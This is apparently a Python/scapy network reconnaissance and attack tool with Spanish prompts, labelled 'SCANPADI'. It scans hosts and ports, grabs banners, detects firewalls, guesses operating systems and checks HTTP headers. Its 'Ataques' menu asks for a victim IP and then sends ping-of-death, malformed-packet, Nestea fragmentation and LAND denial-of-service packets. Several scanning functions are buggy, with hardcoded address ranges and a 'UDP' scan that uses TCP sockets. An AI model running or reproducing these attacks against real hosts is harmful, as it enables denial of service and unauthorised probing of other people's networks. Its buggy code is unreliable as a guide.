#!/usr/bin/python3
# -.- coding: utf-8 -.-

from scapy.all import *
from termcolor import colored
import subprocess as sub
import re, os, sys, nmap, platform, argparse, time, socket, sys, requests

titulo="""
███████╗ ██████╗ █████╗ ███╗   ██╗██████╗  █████╗ ██████╗ ██╗
██╔════╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔══██╗██║
███████╗██║     ███████║██╔██╗ ██║██████╔╝███████║██║  ██║██║
╚════██║██║     ██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║  ██║██║
███████║╚██████╗██║  ██║██║ ╚████║██║     ██║  ██║██████╔╝██║
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═╝

"""
print(colored(titulo,'blue'))

parse = argparse.ArgumentParser()
parse.add_argument("-r", "--range", help="Rango de direcciones a escanear")
#parse.add_argument("-p", "--ports", help="Rango de direcciones a escanear")
parse=parse.parse_args()


def Arp_Ping(ip):

    global hosts
    hosts=[]
    start_time=time.time()
    range_ip=ARP(pdst=ip)
    broadcast=Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet=broadcast/range_ip
    res=srp(final_packet, timeout=2, verbose=False)[0]
    print(colored("[*] ARP Ping\n",'blue', attrs = ['bold']))
    for n in res:
        print(colored("[+] Host: {}        MAC: {}".format(n[1].psrc, n[1].hwsrc),'green', attrs = ['bold']))
        host=n[1].psrc
        hosts.append(host)
    duration=time.time() - start_time
    print(colored("\nCompletada en {0:.3} segundos".format(duration),'green', attrs = ['bold']))
    return hosts

def Puertos_abiertos(ip):
    list_ports=list(range(20,130))
    for host in hosts:
        print(colored("\n[*] Escaneando puertos para la IP: {} ".format(host),'green', attrs = ['bold']))
        for port in list_ports:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                s.connect((host,port))
                print(colored("\n[*] Puerto {} abierto".format(port)),'green', attrs = ['bold'])
                s.close()
            except:
                pass




def Tcp_Ping(ip):

    #en el momento que se haga ping con algunos de estos puertos TCP la IP estará activa
    port_range=[8,21,22,23,25,42,43,49,53,80,85,88,111,139,443,445,3306,3389,4443,8080]

    print(colored("\n[*] TCP Ping\n",'blue', attrs = ['bold']))
    ipDividida = ip.split('.')
    red = ipDividida[0]+'.'+ipDividida[1]+'.'+ipDividida[2]+'.'

    for ip in range (136,138):
        print("IP: "+red+str(ip))
        for port in port_range:
            target=red+str(ip)
            tcpRequest = IP(dst=target)/TCP(dport=port,flags="S")
            tcpResponse = sr1(tcpRequest,timeout=0.3,verbose=False)
            try:
                if (tcpResponse.getlayer(TCP).flags == "SA"):
                    print("IP activa: "+red+str(ip))
                    #print("Puerto abierto: "+str(port))
                    #list.append(target)
                    break
            except AttributeError:
                pass

def Udp_Ping(target):
    print(colored("\n[*] UDP Ping\n",'blue', attrs = ['bold']))
    ip = target
    port_range=[7,9,11,13,17,18,19,37,42,49,53,67,68,69,71,73,74,80,88,104,105,107,108,111]
    udp_lista=[]
    ipSplit = target.split('.')
    red = ipSplit[0]+'.'+ipSplit[1]+'.'+ipSplit[2]+'.'
    status=0
    for host in range (83, 84):
        print ("Scanning: "+ red+str(host))

        ip=red+str(host)
        for port in port_range:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((ip, int(port)))
                udp_lista.append(ip)
                s.close
                break
            except:
                pass
                s.close()
    #listado de hosts activos
    if udp_lista != 0:
        for tar in udp_lista:
            print(tar+ " is UP")
    else:
        print(colored("\n[*] Ningun puerto UDP abierto\n",'red', attrs = ['bold']))



def Icmp_Ping(target):
    print(colored("\n[*] ICMP Ping\n",'blue', attrs = ['bold']))
    list=[]
    ipSplit = target.split('.')
    red = ipSplit[0]+'.'+ipSplit[1]+'.'+ipSplit[2]+'.'
    for ip in range (80, 85):
        print(colored("[*] Escaneando... ",'yellow', attrs = ['bold']))
        print (colored("IP: "+ red+str(ip),'yellow', attrs = ['bold']))
        print("")
        try:
            packet = IP(dst=(red + str(ip)), ttl=20)/ICMP()
            reply = sr1(packet, timeout=0.5, verbose=False)
            if not (reply is None):
                host=red+str(ip)
                list.append(host)
            else:
                pass
        except:
            pass

    if list != 0:
        for tar in list:
            print(colored(tar+ " is UP",'green', attrs = ['bold']))
    print("")

def syn_scan(target):
    i=1
    status_host=0
    while i <= 1024:
	    tcpRequest = IP(dst=target)/TCP(dport=i,flags="S")
	    tcpResponse = sr1(tcpRequest,timeout=0.5,verbose=0)
	    try:
	       	if tcpResponse.getlayer(TCP).flags == "SA":
                    src_port = random.randint(1025,65534)
                    status_host=1
                    resp = sr1(IP(dst=target)/TCP(sport=src_port,dport=i,flags="S"),timeout=1, verbose=0)
                    time.sleep(0.5)
                    if resp is None:
                        print(f"{target} : {i} is filtered.")
                    elif(resp.haslayer(TCP)):
                        if(resp.getlayer(TCP).flags == 0x12):
                            send_rst = sr( IP(dst=target)/TCP(sport=src_port,dport=i,flags='R'), timeout=1, verbose=0)
                            grab_banner(target,i)
                        elif (resp.getlayer(TCP).flags == 0x14):
                            pass
	    except AttributeError:
	       	if i == 1024 and status_host==0:
	            print(target," is Down")
	    i+=1
def grab_banner(target,port):
    try:
        s=socket.socket()
        s.connect((target,port))
        s.send(b'GET /\n\n')
        resp=str(s.recv(1024))
        if re.search("HTTP", resp):
            print(colored("\n[+] Banner Grabbing\n",'blue', attrs = ['bold']))
            res=requests.get("http://"+target+":"+str(port))
            print(colored(target +":"+ str(port) +" / "+ res.headers['server'],'green', attrs = ['bold']))

        else:
            print(colored("\n[+] Banner Grabbing\n",'blue', attrs = ['bold']))
            print(colored(target + " : " + str(port) + " -> " + str(resp).strip('b'),'green', attrs = ['bold']))

    except:
        return
def Puerto_abierto(hosts,ports):
    global ports_open
    ports_open=[]
    for port in range(1,1024):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result=s.connect_ex((hosts,port))
        if result == 0:
            print("Puerto abierto")
            ports_open.append(port)
        else:
            print("Puerto no abierto")
            s.close()
    return ports_open

def Firewall_Detection():
    print(colored("\n[+] Firewall Detection...\n",'blue', attrs = ['bold']))
    ip=input("Introduce target: ")
    print(colored("\n[+] Chequeando IP {} ...\n".format(ip),'green', attrs = ['bold']))
    src_port = RandShort()
    status=0

    port_range=[7,9,13,17,19,26,30,32,33,37,42,43,49,53,70,79,85,88,90,99,100,106,109,111,139,143,144,146,161,163,179,199,211,212,222,254,366,389,443,445,458,464,465,481,497,500,512,515,787,800,801,808,843,873,880,888,898,900,903,911,912,981,987,990,992,993,995,999,1002,1169,3306,3322,3325,3333,3351,3367,3369,3372,3389,3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689,3690,3703,3737,3766,3784,3800,3801,3809,3814,4443,4446,4449,4550,4567,4662,4848,4899,4900,6543,6547,6565,6567,6580,6646,6666,6669,6689,6692,6699,6779,6788,6789,6792,6839,6881,6901,6969,7100,7103,7106,7200,7443,7496,8042,8045,8080,8090,8093,8099,8100,8180,8181,8192,8194,8200,8800,8873,8888,8899,8994,9000,9003,9009,9011,9040,9050,9071,9080,9081,9090,44443,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055,55056,55555,55600]
    for dst_port in port_range:
        dst_port1=str(dst_port)
        print (colored("[*] Puerto: {}".format(dst_port1),'magenta', attrs = ['bold']))
        ack_pkt = sr1(IP(dst=ip)/TCP(dport=dst_port,flags="A"),timeout=0.5, verbose=False)
        try:
            if (ack_pkt==None):
                status=1
            elif(ack_pkt and ack_pkt.haslayer(TCP) and ack_pkt.getlayer(TCP).flags=='R'):
                if(ack_pkt.getlayer(TCP).flags == 0x4):
                    status=2
                    break
                elif(ack_pkt.haslayer(ICMP)):
                    if(int(ack_pkt.getlayer(ICMP).type)==3 and int(ack_pkt.getlayer(ICMP).code) in [1,2,3,9,10,13]):
                        status=3
        except:
            print("Host unreacheble.")

    if status==1:
        print(colored("\n[+] Stateful firewall present (Filtered) or host unreachable",'red', attrs = ['bold']))
    elif (status == 2):
            print(colored("\n[+] No firewall detected",'green', attrs = ['bold']))
    elif (status==3):
            print(colored("\n[+] Stateful firewall present (Filtered) or host unreachable",'yellow', attrs = ['bold']))




def OS_enumeration(ip):
    if (platform.system() == "Windows"):
        ping="ping -n 1 "
    else:
        ping= "ping -c 1 "

    print(colored("\n[+] Enumeracion Sistema Operativo",'blue', attrs = ['bold']))
    try:
        for host in hosts:
            response= os.popen(ping + ""+host)
            for line in response.readlines():
                if("ttl=128" in line.lower()):
                    print(colored("El Host {} es Windows".format(host),'green', attrs = ['bold']))
                elif ("ttl=64" in line.lower()):
                    print(colored("El Host {} es Linux".format(host),'green', attrs = ['bold']))
                else:
                    pass

    except Exception as e:
        print (e)

def Http_enumeration(ip):
    print(colored("\n[+] Enumeracion HTTP: \n",'blue', attrs = ['bold']))

    try:
        url=input("Introduce url (Ej: www.google.com): ")
        response=requests.head("https://"+url)

        '''XSS PROTECTION'''
        if (response.headers['X-XSS-Protection']) == '0':
            print (colored("X-XSS-Protection -> implementada pero desactivada la proteccion",'yellow', attrs = ['bold']))
        elif (response.headers['X-XSS-Protection']) == '1':
            print (colored("X-XSS-Protection -> implementada y activada la proteccion",'green', attrs = ['bold']))
        else:
            print (colored("X-XSS-Protection -> no implementada",'red', attrs = ['bold']))
            pass

        '''HTTP Strict Transport Security (HSTS)'''

        if 'Strict-Transport-Security' in response.headers:
            print(colored("Strict-Transport-Security -> implementada",'green', attrs = ['bold']))
        else:
            print(colored("Strict-Transport-Security -> no implementado",'red', attrs = ['bold']))

        '''X-Frame-Options'''
        if (response.headers["X-Frame-Options"])=='deny':
            print(colored("X-Frame-Options -> implementada, la web no puede ser cargada nunca como iframe: ",'green', attrs = ['bold']))
        elif (response.headers["X-Frame-Options"])=='SAMEORIGIN':
             print(colored("X-Frame-Options -> implementada, la web solo puede ser cargada en el mismo dominio",'yellow', attrs = ['bold']))
        elif (response.headers["X-Content-Type-Options: "])=='allow':
            print (colored("X-Frame-Options -> implementada, la web solo podra ser cargda como iframe en el mismo dominio",'yellow', attrs = ['bold']))
        else :
            print(colored("X-Content-Type-Options -> no implementado",'red', attrs = ['bold']))

        ''' X-XSS-Protection'''
        if (response.headers["X-XSS-Protection"]=='0'):
            print(colored("X-XSS-Protection -> implementada pero nivel de seguridad bajo",'yellow', attrs = ['bold']))
        elif (response.headers["X-XSS-Protection"]=='1'):
            print(colored("X-XSS-Protection -> implementada y nivel de seguridad alto",'green', attrs = ['bold']))
        else:
            print(colored("X-XSS-Protection -> no implementado",'red', attrs = ['bold']))

        '''X-Content-Type-Options'''
        if 'Content-Type' in response.headers:
            print(colored("Content-Type -> implementado",'green', attrs = ['bold']))
        else:
            print(colored("Content-Type -> no implementado",'red', attrs = ['bold']))
    except Exception as e:
        print (colored(e,'red', attrs = ['bold']))

def chunks(l,n):
    for i in range(0, len(l), n):
        yield l[i:i +n]

def Ataques():
    salir = False
    opcion = 0
    while not salir:
        print (colored("1. Ping de la muerte",'green', attrs = ['bold']))
        print (colored("2. Paquetes mal formados",'green', attrs = ['bold']))
        print (colored("3. Ataque Nestea",'green', attrs = ['bold']))
        print (colored("4. Ataque LAND",'green', attrs = ['bold']))
        print (colored("5. Salir",'green', attrs = ['bold']))

        opcion = int(input("Elige una opcion: "))

        if opcion == 1:
            '''Ping de la muerte'''
            ip_victima=input("Introduce la IP de la victima: ")
            print(colored("\nEmpezando ataque ping de la muerte...",'yellow', attrs = ['bold']))
            send(fragment(IP(dst=ip_victima)/ICMP()/('X'*60000)))
            print("\n")

        elif opcion == 2:
            '''Paquetes mal formados'''
            ip_victima=input("Introduce la IP de la victima: ")
            print(colored("\nEmpezando formateo erroneo de los paquetes...",'yellow', attrs = ['bold']))
            send(IP(dst= ip_victima , ihl=2,version=3)/ICMP())
            print("\n")

        elif opcion == 3:
            '''Ataque Nestea'''
            print(colored("\nEmpezando ataque Nestea...",'yellow', attrs = ['bold']))
            ip_victima=input("Introduce la IP de la victima: ")
            send(IP(dst=ip_victima, id=42, flags='MF')/UDP()/('X'*10))
            send(IP(dst=ip_victima, id=42, frag=48)/('X'*116))
            send(IP(dst=ip_victima, id=42, flags='MF')/UDP()/('X'*224))
            print("\n")

        elif opcion == 4:
            '''Ataque LAND'''
            print(colored("\nEmpezando ataque LAND...",'yellow', attrs = ['bold']))
            ip_victima=input("Introduce la IP de la victima: ")
            port_victima=int(input("Introduce un puerto de la victima: "))
            send(IP(src=ip_victima,dst=ip_victima)/TCP(sport=port_victima,dport=port_victima))
            print("\n")

        elif opcion == 5:
            salir=True
            print ("Saliendo ...")
        else:
            print ("Introduce un numero entre 1 y 5")



def Reconnaissance(ip):
    Arp_Ping(ip)
    Udp_Ping(ip)
    Firewall_Detection()
    Icmp_Ping(ip)






def main():
    if parse.range:
        Reconnaissance(parse.range)
        print(colored("\n[*] SYN scan",'blue', attrs = ['bold']))
        target=input("Introduce target: ")
        syn_scan(target)
        OS_enumeration(parse.range)
        Http_enumeration(parse.range)

        option=input(colored("\n¿Quieres llevar a cabo ataques contra una victima (S/N): ",'yellow', attrs = ['bold']))

        if (option == "S" or option =="Si"):
            Ataques()
        elif (option == "N" or option =='No'):
            print("Saliendo...")

    else:
        print(colored("[-] Necesito un rango de IP's a escanear\n",'red', attrs = ['bold']))

if __name__== "__main__":
    main()
